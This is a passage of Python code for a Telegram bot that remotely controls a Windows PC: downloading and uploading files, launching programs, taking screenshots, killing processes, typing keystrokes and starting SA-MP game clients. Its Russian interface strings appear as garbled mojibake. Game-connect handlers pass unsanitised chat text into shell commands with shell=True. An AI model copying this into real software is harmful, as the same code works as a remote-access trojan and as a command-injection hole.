    item2=types.KeyboardButton("–ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤")
    item3=types.KeyboardButton("–ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª/–ø—Ä–æ–≥—Ä–∞–º–º—É")
    item4=types.KeyboardButton("–°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª —Å –ü–ö")
    item5=types.KeyboardButton("–í—ã–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ –ü–ö")
    item6=types.KeyboardButton("–ù–∞–∑–∞–¥")
    markup.add(item0, item1, item2, item3, item4, item5, item6)
    bot.send_message(message.chat.id, '*üóÇ –í—ã –≤ –º–µ–Ω—é —Ñ–∞–π–ª–æ–≤!*', reply_markup=markup, parse_mode="Markdown")
    return bot.register_next_step_handler(message, files_menu_check)

def files_menu_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤':  return change_file_menu(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return mainmenu(message)
    elif message.text.strip() == '–£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤/–ø–∞–ø–æ–∫': return delete_menu(message)
    elif message.text.strip() == '–í—ã–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ –ü–ö': return download_on_pc_menu(message)
    elif message.text.strip() == '–°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤/–ø–∞–ø–æ–∫':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–°–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª"), types.KeyboardButton("–°–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É"), types.KeyboardButton("–ù–∞–∑–∞–¥"))

        bot.send_message(message.chat.id, '*‚úçÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ —Ç–æ, —á—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ–∑–¥–∞—Ç—å –∏–ª–∏ –≤–µ—Ä–Ω–∏—Ç–µ—Å—å –Ω–∞–∑–∞–¥!*', reply_markup=markup, parse_mode="Markdown")
        return bot.register_next_step_handler(message, check_create)

    elif message.text.strip() == '–ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª/–ø—Ä–æ–≥—Ä–∞–º–º—É':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

        bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞(–ü—Ä–∏–º–µ—Ä: test.txt), –µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–µ –∏–∑ —ç—Ç–æ–π –ø–∞–ø–∫–∏, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å!*', reply_markup=markup, parse_mode="Markdown")
        return bot.register_next_step_handler(message, open_file)

    elif message.text.strip() == '–°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª —Å –ü–ö':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

        bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞(–ü—Ä–∏–º–µ—Ä: test.txt), –µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–µ –∏–∑ —ç—Ç–æ–π –ø–∞–ø–∫–∏, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å (–¥–æ 50 –º–±)*', reply_markup=markup, parse_mode="Markdown")
        return bot.register_next_step_handler(message, download_file)

    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä!\n–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
    return files_menu(message)


def check_create(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '–ù–∞–∑–∞–¥': return files_menu(message)
    elif message.text.strip() == '/start': return start(message)
    if message.text.strip() == '–°–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

        bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞(–ü—Ä–∏–º–µ—Ä: test.txt)!*', parse_mode="Markdown", reply_markup=markup)
        return bot.register_next_step_handler(message, create_file)

    elif message.text.strip() == '–°–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

        bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –Ω–æ–≤–æ–π –ø–∞–ø–∫–µ –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –≤–≤–µ–¥–∏—Ç–µ –µ–µ –Ω–∞–∑–≤–∞–Ω–∏–µ, –µ—Å–ª–∏ —Ö–æ—Ç–∏—Ç–µ –µ–µ —Å–æ–∑–¥–∞—Ç—å –≤ –º–µ—Å—Ç–µ, –≥–¥–µ –∑–∞–ø—É—â–µ–Ω —Å–∫—Ä–∏–ø—Ç\n\n‚ùóÔ∏è –ü—Ä–∏–º–µ—Ä –ø—É—Ç–∏: C:\\–ù–æ–≤–∞—è –ø–∞–ø–∫–∞*', parse_mode="Markdown", reply_markup=markup)
        return bot.register_next_step_handler(message, create_folder)

    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä!\n–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode="Markdown")
    return files_menu(message)

def create_folder(message: types.Message):
    if is_access_denied(message.chat.id): return None

    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return files_menu(message)
    try: os.mkdir(message.text.strip())
    except:
        bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç –º–µ—Å—Ç–∞*', parse_mode="Markdown")
        return files_menu(message)
    
    bot.send_message(message.chat.id, f'*‚òëÔ∏è –ü–∞–ø–∫–∞ –ø–æ –ø—É—Ç–∏ "{message.text.strip()}" –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!*', parse_mode="Markdown")
    return files_menu(message)


def download_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return files_menu(message)

    try: bot.send_document(message.chat.id, open(message.text.strip(), 'rb')) 
    except: bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç*', parse_mode='Markdown')
        
    return files_menu(message)


def open_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == "/start": return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return files_menu(message)
            
    try: os.startfile(message.text.strip())
    except: bot.send_message(message.chat.id, '‚ùå *–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –¥–æ—Å—Ç—É–ø!* –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É', parse_mode="Markdown")
    else: bot.send_message(message.chat.id, f'*‚òëÔ∏è –§–∞–π–ª {message.text.strip()} —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!*', parse_mode="Markdown")
    
    return files_menu(message)



def create_error(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return console_menu(message)

    bot.send_message(message.chat.id, '‚ùóÔ∏è *–í–ø–∏—à–∏—Ç–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –æ—à–∏–±–∫–∏!*', parse_mode='Markdown')
    return bot.register_next_step_handler(message, create_error_check, message.text.strip())

def create_error_check(message: types.Message, title: str):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return console_menu(message)

    bot.send_message(message.chat.id, '‚ùóÔ∏è *–û—à–∏–±–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!*', parse_mode='Markdown')
    console_menu(message)
    return windll.user32.MessageBoxW(0, message.text.strip(), title, 0x1000)


def console_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    item0=types.KeyboardButton("–í–≤–æ–¥ –∫–æ–º–∞–Ω–¥")
    item1=types.KeyboardButton("–ó–∞–ø—É—Å—Ç–∏—Ç—å Python —Å–∫—Ä–∏–ø—Ç")
    item2=types.KeyboardButton("–°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç")
    item3=types.KeyboardButton("–û—Ç–∫—Ä—ã—Ç—å —Å–∞–π—Ç")
    item4=types.KeyboardButton("–°–æ–∑–¥–∞—Ç—å –æ—à–∏–±–∫—É")
    item5=types.KeyboardButton("–°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤")
    item6=types.KeyboardButton("–ù–∞–∑–∞–¥")
    markup.add(item0, item1, item2, item3, item4, item5, item6)

    bot.send_message(message.chat.id, 'üíª *–í—ã –≤ –º–µ–Ω—é –∫–æ–Ω—Å–æ–ª–∏!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, console_menu_check)

def console_menu_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '–ù–∞–∑–∞–¥': return mainmenu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤': return process_list(message)
    elif message.text.strip() == '–í–≤–æ–¥ –∫–æ–º–∞–Ω–¥': 
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=False, resize_keyboard=True)
            for i in FAST_CMDS: markup.add(types.KeyboardButton(i))
            markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

            bot.send_message(message.chat.id, 'üñ• *–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∫–æ–Ω—Å–æ–ª–∏!\n\n‚ùóÔ∏è –ü—Ä–∏ –ª—é–±—ã—Ö –Ω–µ–ø–æ–Ω—è—Ç–Ω—ã—Ö —Å–∏—Ç—É–∞—Ü–∏—è—Ö –≤–≤–æ–¥–∏—Ç–µ /start*', reply_markup=markup, parse_mode='Markdown')
            return bot.register_next_step_handler(message, console_commands)

    elif message.text.strip() == '–°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç':
        try:
            if os.path.exists('C:\\temp\\') == False: make_temp_folder()

            pyautogui.screenshot('C:\\temp\\screenshot.png')
            bot.send_document(message.chat.id, open('C:\\temp\\screenshot.png', 'rb'))
            return console_menu(message)

        except PermissionError:
            bot.send_message(message.chat.id, '‚ùå *–£ –±–æ—Ç–∞ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤!*', parse_mode='Markdown')
            return console_menu(message)

    elif message.text.strip() == '–°–æ–∑–¥–∞—Ç—å –æ—à–∏–±–∫—É':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

        bot.send_message(message.chat.id, '‚ùóÔ∏è *–í–≤–µ–¥–∏—Ç–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –æ—à–∏–±–∫–∏!*', parse_mode='Markdown', reply_markup=markup)
        return bot.register_next_step_handler(message, create_error)

    elif message.text.strip() == '–ó–∞–ø—É—Å—Ç–∏—Ç—å Python —Å–∫—Ä–∏–ø—Ç':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

        bot.send_message(message.chat.id, '‚ùóÔ∏è *–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å —Å–∫—Ä–∏–ø—Ç–∞!*', parse_mode='Markdown', reply_markup=markup)
        return bot.register_next_step_handler(message, python_scripts)

    elif message.text.strip() == '–û—Ç–∫—Ä—ã—Ç—å —Å–∞–π—Ç':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

        bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å —Å–∞–π—Ç–∞!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, open_site)

    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
    return console_menu(message)


def process_list(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    processes = '–°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤:\n\n'
    for i in psutil.pids():
        try: processes+=f'ID: {i}\n–ù–∞–∑–≤–∞–Ω–∏–µ: {psutil.Process(i).name()}\n–ü—É—Ç—å: P{psutil.Process(i).exe()}\n\n'    
        except: continue
                
    if os.path.exists('C:\\temp\\') == False: make_temp_folder()

    bot.send_message(message.chat.id, f'‚òëÔ∏è C–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –±—ã–ª *—Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ —Ñ–∞–π–ª –Ω–∏–∂–µ*!\n\n–í–≤–µ–¥–∏—Ç–µ *ID –ø—Ä–æ—Ü–µ—Å—Å–∞* –¥–ª—è —É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è –∏–ª–∏ *–Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É "–ù–∞–∑–∞–¥"*', parse_mode = "Markdown")
    with open("C:\\temp\\processes.txt", "w", encoding="utf-8") as file: file.write(processes)

    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

    bot.send_document(message.chat.id, document = open('C:\\temp\\processes.txt', 'rb'), reply_markup=markup)
    os.remove('C:\\temp\\processes.txt')
    return bot.register_next_step_handler(message, check_process_list)

def check_process_list(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '–ù–∞–∑–∞–¥': return console_menu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip().isdigit() == False:
        bot.send_message(message.chat.id, '‚ùå *–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! ID –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º*', parse_mode='Markdown')
        return console_menu(message)
        
    kill_id = int(message.text.strip())
    parent = psutil.Process(kill_id)

    try:
        for child in parent.children(recursive=True): child.kill()
        parent.kill()
        
    except psutil.NoSuchProcess: bot.send_message(message.chat.id, '‚ùå *–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! –ü—Ä–æ—Ü–µ—Å—Å–∞ —Å —Ç–∞–∫–∏–º ID –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç*', parse_mode='Markdown')
    except psutil.AccessDenied: bot.send_message(message.chat.id, '‚ùå *–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! –î–ª—è —É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è –¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤*', parse_mode='Markdown')
    finally: bot.send_message(message.chat.id, f'‚òëÔ∏è –ü—Ä–æ—Ü–µ—Å—Å —Å ID *{kill_id}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ —É–Ω–∏—á—Ç–æ–∂–µ–Ω!', parse_mode = "Markdown")
    return console_menu(message)


def open_site(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '–ù–∞–∑–∞–¥': return console_menu(message)
    elif message.text.strip() == '/start': return start(message)

    webopen(message.text.strip(), new=2)
    bot.send_message(message.chat.id, f'‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã–ª–∏ {message.text.strip()}*', parse_mode='Markdown')
    return console_menu(message)


def media_keys(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ü–∞—É–∑–∞/–°—Ç–∞—Ä—Ç"), types.KeyboardButton("–ü–µ—Ä–µ–º–æ—Ç–∫–∞ –≤–ø–µ—Ä—ë–¥"), types.KeyboardButton("–ù–∞–∑–∞–¥"))

    bot.send_message(message.chat.id, '‚å®Ô∏è *–í—ã –≤ –º–µ–Ω—é –º–µ–¥–∏–∞-–∫–ª–∞–≤–∏—à!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, media_keys_check)

def media_keys_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return keyboard_menu(message)
    elif message.text.strip() == '–ü–∞—É–∑–∞/–°—Ç–∞—Ä—Ç': keyboard.send('play/pause media')
    elif message.text.strip() == '–ü–µ—Ä–µ–º–æ—Ç–∫–∞ –≤–ø–µ—Ä—ë–¥': keyboard.send('alt+right')

    return media_keys(message)


def keyboard_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ù–∞–ø–µ—á–∞—Ç–∞—Ç—å —á—Ç–æ-—Ç–æ"), types.KeyboardButton("–ù–∞–∂–∞—Ç—å –∫–ª–∞–≤–∏—à–∏"), types.KeyboardButton("–ú–µ–¥–∏–∞-–∫–ª–∞–≤–∏—à–∏"), types.KeyboardButton("–ù–∞–∑–∞–¥"))
        
    bot.send_message(message.chat.id, '‚å®Ô∏è *–í—ã –≤ –º–µ–Ω—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, keyboard_check)

def keyboard_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '–ù–∞–∑–∞–¥': return mainmenu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–ø–µ—á–∞—Ç–∞—Ç—å —á—Ç–æ-—Ç–æ': return keyboard_write(message)
    elif message.text.strip() == '–ù–∞–∂–∞—Ç—å –∫–ª–∞–≤–∏—à–∏': return keyboard_keys(message)
    elif message.text.strip() == '–ú–µ–¥–∏–∞-–∫–ª–∞–≤–∏—à–∏': return media_keys(message)

    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
    return keyboard_menu(message)


def keyboard_write(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    for i in FAST_KEYS: markup.add(types.KeyboardButton(i))
    markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

    bot.send_message(message.chat.id, '‚å®Ô∏è *–í–ø–∏—à–∏—Ç–µ —Ç–æ, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç—å c –ø–æ–º–æ—â—å—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã, –∏–ª–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –≥–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏ –∏–∑ —Å–ø–∏—Å–∫–∞ –Ω–∏–∂–µ!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, keyboard_write_check)

def keyboard_write_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == "–ù–∞–∑–∞–¥": return keyboard_menu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() in FAST_KEYS: keyboard.press(message.text.strip())
    else: keyboard.write(message.text.strip(), delay=0.2)

    return keyboard_write(message)


def keyboard_keys(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    for i in FAST_KEYS: markup.add(types.KeyboardButton(i))
    markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))
        
    bot.send_message(message.chat.id, '‚å®Ô∏è *–í–ø–∏—à–∏—Ç–µ –∏–ª–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –Ω–∏–∂–µ —Ç–æ, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—å!\n\n–ü—Ä–∏–º–µ—Ä—ã:\nalt - –Ω–∞–∂–º–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ alt\nalt+f4 - alt –∏ f4 –Ω–∞–∂–º—É—Ç—Å—è –≤–º–µ—Å—Ç–µ*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, keyboard_keys_check)

def keyboard_keys_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == "–ù–∞–∑–∞–¥": return keyboard_menu(message)
    elif message.text.strip() == '/start': return start(message)

    try: keyboard.send(message.text.strip())
    except ValueError: bot.send_message(message.chat.id, '‚ùå *–û–¥–Ω–∞ –∏–ª–∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏–∑ –∫–ª–∞–≤–∏—à –Ω–µ –±—ã–ª–∞ –Ω–∞–π–¥–µ–Ω–∞! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
    
    return keyboard_keys(message)


def samp_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    markup.add(types.KeyboardButton("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ SAMP —Å–µ—Ä–≤–µ—Ä—É"), types.KeyboardButton("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ RakLaunch Lite"), types.KeyboardButton("–ù–∞–∑–∞–¥"))

    bot.send_message(message.chat.id, '*üòá –í—ã –≤ –º–µ–Ω—é SAMP!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, samp_check)

def samp_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == "–ù–∞–∑–∞–¥": return mainmenu(message)
    elif message.text.strip() == "/start": return start(message)
    elif message.text.strip() == '–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ SAMP —Å–µ—Ä–≤–µ—Ä—É':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

        bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ IP —Å–µ—Ä–≤–µ—Ä–∞, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π –≤—ã —Ö–æ—Ç–∏—Ç–µ –∑–∞–π—Ç–∏!\n\nP.s. –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –Ω–∏–∫, –ø–æ–¥ –∫–æ—Ç–æ—Ä—ã–º –≤—ã –∏–≥—Ä–∞–ª–∏ –≤ –ø–æ—Å–ª–µ–¥–Ω–∏–π —Ä–∞–∑!*', parse_mode='Markdown', reply_markup=markup)
        return bot.register_next_step_handler(message, samp_connect)

    elif message.text.strip() == '–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ RakLaunch Lite':
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        markup.add(types.KeyboardButton("–ù–∞–∑–∞–¥"))

        bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –ø–æ —Ñ–æ—Ä–º–µ –Ω–∏–∂–µ:\nnickname,ip,port\n–ü—Ä–∏–º–µ—Ä: Little_Bot,127.0.0.1,7777*', parse_mode='Markdown', reply_markup=markup)
        return bot.register_next_step_handler(message, raklite_connect)

    bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
    return samp_menu(message)


def samp_connect(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return samp_menu(message)

    try:
        bot.send_message(message.chat.id, f'‚òëÔ∏è –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ —Å–µ—Ä–≤–µ—Ä—É —Å IP *{ message.text.strip()}*...', parse_mode = "Markdown")
        samp_menu(message)
        return subprocess.Popen(f'{SAMP_ROUTE}\samp.exe {message.text.strip()}', shell=True)
        
    except: bot.send_message(message.chat.id, '‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–∞—à settings.ini', parse_mode = "Markdown")
    return samp_menu(message)

def raklite_connect(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == '–ù–∞–∑–∞–¥': return samp_menu(message)

    info = message.text.strip().split(',') # –Ω–∏–∫,ip,port
    if len(info) != 3:
        bot.send_message(message.chat.id, '*‚ùå –í—ã –Ω–µ –¥–æ–ø–∏—Å–∞–ª–∏ –≤—Å–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –ø–æ–∑–∂–µ*', parse_mode = "Markdown")
        return samp_menu(message)

    bot.send_message(message.chat.id, f'‚òëÔ∏è –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ *{info[1]}:{info[2]}*', parse_mode = "Markdown")
    samp_menu(message)

    try: return subprocess.Popen(f'"{RAKLITE_ROUTE}\RakSAMP Lite.exe" -n {info[0]} -h {info[1]} -p {info[2]} -z', shell=True)
    except:
        bot.send_message(message.chat.id, '‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞!! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–∞—à settings.ini', parse_mode = "Markdown")
        return samp_menu(message)


def other_functions(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    item0 = types.KeyboardButton("–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –ü–ö") 
    item1 = types.KeyboardButton("–í—ã—Ö–æ–¥ –∏–∑ —É—á–µ—Ç–∫–∏ –ü–ö")
    item2 = types.KeyboardButton("–í—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö")
